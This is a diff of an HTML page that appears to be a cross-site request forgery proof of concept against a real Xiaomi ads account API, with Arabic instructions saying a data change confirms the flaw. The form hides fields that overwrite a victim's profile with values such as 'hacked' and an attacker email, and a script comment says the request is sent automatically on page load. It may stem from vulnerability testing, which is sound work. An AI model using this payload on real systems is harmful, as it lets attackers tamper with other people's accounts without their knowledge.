@@ -8,27 +8,30 @@
     <p>إذا ظهرت رسالة "تم التحديث" أو تغيرت بياناتك، فالثغرة موجودة.</p>
     
     <form id="csrfForm" action="https://global.e.mi.com/api/v1/account/profile/update?lang=en-US" method="POST">
-        <input type="hidden" name="accountType" value="1" />
-        <input type="hidden" name="companyName" value="CSRF_TEST" />
-        <input type="hidden" name="country" value="Afghanistan" />
-        <input type="hidden" name="industryLevel1" value="6" />
-        <input type="hidden" name="registrationInfo" value='[{"name":"test.png","url":"https://example.com/test.png"}]' />
-        <input type="hidden" name="gstCertificateInfo" value="CSRF_TEST" />
-        <input type="hidden" name="panCardCInfo" value="123456" />
-        <input type="hidden" name="licenseInfo" value='[{"name":"test.png","url":"https://example.com/test.png"}]' />
-        <input type="hidden" name="firstName" value="CSRF_Test" />
-        <input type="hidden" name="lastName" value="Hacker" />
-        <input type="hidden" name="email" value="csrf_test@example.com" />
-        <input type="hidden" name="address" value="CSRF_Address" />
-        <input type="hidden" name="settlementId" value="1" />
-        <input type="hidden" name="telephone" value="92012414412" />
-        <input type="hidden" name="settlementCurrency" value="1" />
-        <input type="hidden" name="isAccept" value="false" />
-        <input type="hidden" name="accountId" value="19350" />
-        <input type="hidden" name="isAutoRecharge" value="0" />
-        <input type="hidden" name="autoRechargeCash" value="0" />
-        <input type="hidden" name="lang" value="en-US" />
-    </form>
+    <input type="hidden" name="accountType" value="1">
+    <input type="hidden" name="companyName" value="hacked">
+    <input type="hidden" name="country" value="Afghanistan">
+    <input type="hidden" name="industryLevel1" value="6">
+    <input type="hidden" name="registrationInfo" value='[{"name":"normal.png","url":"https://azpn0-fds.api.xiaomi.net/miads-polaris/ff2bec5550df4675986d4ad3910833d6.png"}]'>
+    <input type="hidden" name="gstCertificateInfo" value="gstCertificateInfo">
+    <input type="hidden" name="panCardCInfo" value="123456">
+    <input type="hidden" name="licenseInfo" value='[{"name":"normal.png","url":"https://azpn0-fds.api.xiaomi.net/miads-polaris/05c9b57767e5403da597353c4e9f25bc.png"}]'>
+    <input type="hidden" name="firstName" value="hacked">
+    <input type="hidden" name="lastName" value="hacked">
+    <input type="hidden" name="email" value="hacker@gmail.com">
+    <input type="hidden" name="address" value="caddress/test123">
+    <input type="hidden" name="settlementId" value="1">
+    <input type="hidden" name="telephone" value="92012414412">
+    <input type="hidden" name="saleStuffEmail" value="">
+    <input type="hidden" name="settlementCurrency" value="1">
+    <input type="hidden" name="isAccept" value="false">
+    <input type="hidden" name="accountId" value="19350">
+    <input type="hidden" name="isAutoRecharge" value="0">
+    <input type="hidden" name="autoRechargeCash" value="0">
+    <input type="hidden" name="lang" value="en-US">
+
+    <button type="submit">Submit</button>
+</form>
     
     <script>
         // إرسال الطلب تلقائيًا عند تحميل الصفحة
